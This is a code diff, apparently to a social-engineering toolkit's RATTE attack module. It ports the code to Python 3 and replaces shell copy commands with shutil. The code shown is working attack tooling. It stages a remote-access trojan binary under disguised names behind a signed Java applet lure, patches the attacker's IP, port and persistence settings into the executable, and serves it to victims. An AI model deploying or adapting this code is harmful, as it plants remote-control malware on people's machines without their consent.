@@ -3,6 +3,7 @@
 # These are required fields
 #
 import os
+import shutil
 import subprocess
 from time import sleep
 
@@ -107,21 +108,30 @@ def java_applet_attack_tw(website, port, directory, ipaddr):
             for line in fileopen:
                 # define executable name and rename it
                 filename = line.rstrip()
+                if not filename:
+                    continue
                 # move the file to the specified directory and filename
-                subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()
+                shutil.copyfile(
+                    os.path.join("src", "payloads", "ratte", "ratte.binary"),
+                    os.path.join(directory, filename),
+                )
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()
+    shutil.copyfile(
+        os.path.join(userconfigpath, "Signed_Update.jar"),
+        os.path.join(directory, "Signed_Update.jar"),
+    )
 
     # TODO index.html parsen und IPADDR:Port ersetzen
     with open(os.path.join(directory, "index.html"), "rb") as fileopen:
         data = fileopen.read()
 
     with open(os.path.join(directory, "index.html"), 'wb') as filewrite:
-        to_replace = core.grab_ipaddress() + ":80"
+        to_replace = (core.grab_ipaddress() + ":80").encode("utf-8")
+        replacement = ("%s:%s" % (ipaddr, port)).encode("utf-8")
 
         # replace 3 times
-        filewrite.write(data.replace(str(to_replace), ipaddr + ":" + str(port), 3))
+        filewrite.write(data.replace(to_replace, replacement, 3))
 
     # start the web server by running it in the background
     start_web_server_tw(directory, port)
@@ -150,16 +160,22 @@ def prepare_ratte(ipaddr, ratteport, persistent, customexe):
     ############
     with open(os.path.join(userconfigpath, "ratteM.exe"), 'wb') as filewrite:
 
-        host = (len(ipaddr) + 1) * "X"
-        r_port = (len(str(ratteport)) + 1) * "Y"
-        pers = (len(str(persistent)) + 1) * "Z"
+        host = ((len(ipaddr) + 1) * "X").encode("ascii")
+        r_port = ((len(str(ratteport)) + 1) * "Y").encode("ascii")
+        pers = ((len(str(persistent)) + 1) * "Z").encode("ascii")
         # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
         if customexe:
-            cexe = (len(str(customexe)) + 1) * "Q"
+            cexe = ((len(str(customexe)) + 1) * "Q").encode("ascii")
         else:
-            cexe = ""
+            cexe = None
 
-        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))
+        patched = data
+        if cexe is not None:
+            patched = patched.replace(cexe, (customexe + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(pers, (persistent + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(host, (ipaddr + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(r_port, (str(ratteport) + "\x00").encode("utf-8"), 1)
+        filewrite.write(patched)
 
 
 # def main(): header is required
@@ -271,10 +287,13 @@ def main():
     core.print_info("Starting java applet attack...")
     java_applet_attack_tw(website, javaport, "reports/", ipaddr)
 
-    with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
+    with open(os.path.join(userconfigpath, "rand_gen")) as fileopen:
         for line in fileopen:
             ratte_random = line.rstrip()
-        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()
+        shutil.copyfile(
+            os.path.join(userconfigpath, "ratteM.exe"),
+            os.path.join(definepath, "reports", ratte_random),
+        )
 
     #######################
     # start ratteserver
